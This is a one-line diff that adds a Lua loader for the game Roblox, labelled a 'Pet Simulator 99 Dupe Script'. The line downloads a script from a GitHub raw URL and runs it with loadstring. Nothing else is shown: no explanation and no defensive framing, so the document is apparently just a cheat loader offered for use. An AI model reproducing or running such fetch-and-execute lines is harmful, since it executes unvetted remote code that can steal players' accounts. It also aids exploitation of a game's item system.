@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/JunBloxYTPlayz/Pet-Simulator-99-Dupe-Script/main/Pet%20Sim%2099%20Dupe%20Script", true))()
